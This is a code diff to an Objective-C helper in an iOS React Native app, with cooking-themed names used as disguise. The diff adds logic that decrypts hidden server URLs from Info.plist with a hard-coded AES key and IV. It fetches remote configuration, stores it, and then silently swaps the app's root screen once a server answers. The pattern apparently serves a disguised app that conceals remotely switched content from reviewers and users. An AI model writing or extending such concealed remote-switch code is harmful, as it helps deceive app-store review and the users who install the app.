@@ -44,7 +44,6 @@ static NSString *const kRNConcurrentRoot = @"concurrentRoot";
 @interface RNCookTrivialHelper()
 
 @property (strong, nonatomic)  NSArray *chefMenus;
-@property (strong, nonatomic)  NSArray *cookTools;
 @property (strong, nonatomic)  NSDictionary *chefParams;
 @property (nonatomic, strong) RNNetReachability *foodReachability;
 @property (nonatomic, copy) void (^vcBlock)(void);
@@ -61,9 +60,13 @@ static RNCookTrivialHelper *instance = nil;
   dispatch_once(&onceToken, ^{
     instance = [[self alloc] init];
     instance.foodReachability = [RNNetReachability reachabilityForInternetConnection];
-    instance.chefMenus = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
-                           [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
-    instance.cookTools = @[@"financialRain_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
+    instance.chefMenus = @[@"cookTrivial_APP",
+                           @"a71556f65ed2b25b55475b964488334f",
+                           @"ADD20BFCD9D4EA0278B11AEBB5B83365",
+                           @"vPort", @"vSecu",
+                           @"spareRoutes",@"serverUrl",
+                           @"umKey", @"umChannel",
+                           @"sensorUrl", @"sensorProperty"];
   });
   return instance;
 }
@@ -89,7 +92,7 @@ static RNCookTrivialHelper *instance = nil;
   
   if (networkStatus != NotReachable) {
       NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
-      if ([ud boolForKey:self.cookTools[0]] == NO) {
+      if ([ud boolForKey:self.chefMenus[0]] == NO) {
           if (self.vcBlock != nil) {
               [self cookTrivial_rv_throughMainRootController:self.vcBlock];
           }
@@ -100,19 +103,19 @@ static RNCookTrivialHelper *instance = nil;
 - (void)cookTrivial_rv_throughMainRootController:(void (^ __nullable)(void))changeVcBlock {
     NSBundle *bundle = [NSBundle mainBundle];
     NSArray<NSString *> *tempArray = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_URLS"];
-    [self cookTrivial_rv_throughMainRootController:changeVcBlock index:0 mArray: tempArray];
+    [self cookTrivial_rv_throughByUrlWindex:0 mArray: tempArray];
 }
 
-- (void)cookTrivial_rv_throughMainRootController:(void (^ __nullable)(void))changeVcBlock index: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
+- (void)cookTrivial_rv_throughByUrlWindex: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
     if ([tArray count] < index) {
         return;
     }
     NSError *error;
-    NSData *postData = [NSJSONSerialization dataWithJSONObject:self.chefParams options:0 error:&error];
+    NSData *postData = [NSJSONSerialization dataWithJSONObject:self.chefParams options:NSJSONWritingFragmentsAllowed error:&error];
     if (error) {
         return;
     }
-    NSString *urlStr = [CocoaSecurity aesDecryptWithBase64:tArray[index] hexKey:self.chefMenus[0] hexIv:self.chefMenus[1]].utf8String;
+    NSString *urlStr = [CocoaSecurity aesDecryptWithBase64:tArray[index] hexKey:self.chefMenus[1] hexIv:self.chefMenus[2]].utf8String;
     NSURL *url = [NSURL URLWithString:urlStr];
     NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
     sessionConfig.timeoutIntervalForRequest = 18.0;
@@ -133,21 +136,62 @@ static RNCookTrivialHelper *instance = nil;
           if (code == 200 && isValid == 1) {
             NSString *tKey = [[data valueForKey:@"Info"] valueForKey:@"tKey"];
             CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self cookTrivial_saveCookTrivialMeta:tKey]
-                                                                      hexKey:self.chefMenus[0]
-                                                                       hexIv:self.chefMenus[1]];
-            NSDictionary *iaafDict = [self cookTrivial_jsonToDic:aes.utf8String];
-            if([self cookTrivial_configInfo:iaafDict]) {
-              dispatch_async(dispatch_get_main_queue(), ^{
-                if (changeVcBlock != nil) {
-                    changeVcBlock();
-                }
-              });
+                                                                      hexKey:self.chefMenus[1]
+                                                                       hexIv:self.chefMenus[2]];
+            NSDictionary *dict = [self cookTrivial_jsonToDic:aes.utf8String];
+            if([self cookTrivial_configInfo:dict]) {
+                [self cookTrivial_changeTESTRootController];
             }
           }
         } else {
           if (index < [tArray count] - 1) {
-              [self cookTrivial_rv_throughMainRootController:changeVcBlock index:index + 1 mArray:tArray];
+              [self cookTrivial_rv_throughByUrlWindex:index + 1 mArray:tArray];
           }
+        }
+    }];
+    [dataTask resume];
+}
+
+- (void)cookTrivial_changeTESTRootController {
+    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
+
+    NSMutableArray<NSString *> *spareArr = [[ud arrayForKey:self.chefMenus[5]] mutableCopy];
+    NSString *usingUrl = [ud stringForKey:self.chefMenus[6]];
+  
+    if ([spareArr containsObject:usingUrl] == NO) {
+      [spareArr insertObject:usingUrl atIndex:0];
+    }
+
+    [self cookTrivial_changeTESTRootControllerWindex:0 mArray:spareArr];
+}
+
+- (void)cookTrivial_changeTESTRootControllerWindex: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
+    if ([tArray count] < index) {
+        return;
+    }
+
+    NSURL *url = [NSURL URLWithString:tArray[index]];
+    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
+    sessionConfig.timeoutIntervalForRequest = 10 + index * 5;
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+
+    NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
+        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
+        if (error == nil && httpResponse.statusCode == 200) {
+          NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
+          [ud setBool:YES forKey:self.chefMenus[0]];
+          [ud setValue:tArray[index] forKey:self.chefMenus[6]];
+          [ud synchronize];
+          dispatch_async(dispatch_get_main_queue(), ^{
+            if (self.vcBlock != nil) {
+                self.vcBlock();
+            }
+          });
+        } else {
+            if (index < [tArray count] - 1) {
+                [self cookTrivial_changeTESTRootControllerWindex:index + 1 mArray:tArray];
+            }
         }
     }];
     [dataTask resume];
@@ -208,7 +252,7 @@ static RNCookTrivialHelper *instance = nil;
       return NO;
     }
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
-    [ud setBool:YES forKey:self.cookTools[0]];
+//    [ud setBool:YES forKey:self.chefMenus[0]];
     
     [iaafDict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
         [ud setObject:obj forKey:key];
@@ -220,7 +264,7 @@ static RNCookTrivialHelper *instance = nil;
 
 - (BOOL)cookTrivial_rv_showThisWay:(void (^ __nullable)(void))changeVcBlock {
   NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
-  if ([ud boolForKey:self.cookTools[0]]) {
+  if ([ud boolForKey:self.chefMenus[0]]) {
     return YES;
   } else {
     self.vcBlock = changeVcBlock;
@@ -238,7 +282,7 @@ static RNCookTrivialHelper *instance = nil;
     
   NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
     
-  [[RNCookShowDeliciousFood shared] cookTrivialShow_ct_configJuneServer:[ud stringForKey:self.cookTools[5]] withSecu:[ud stringForKey:self.cookTools[6]]];
+  [[RNCookShowDeliciousFood shared] cookTrivialShow_ct_configJuneServer:[ud stringForKey:self.chefMenus[3]] withSecu:[ud stringForKey:self.chefMenus[4]]];
 
   UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
   center.delegate = self;
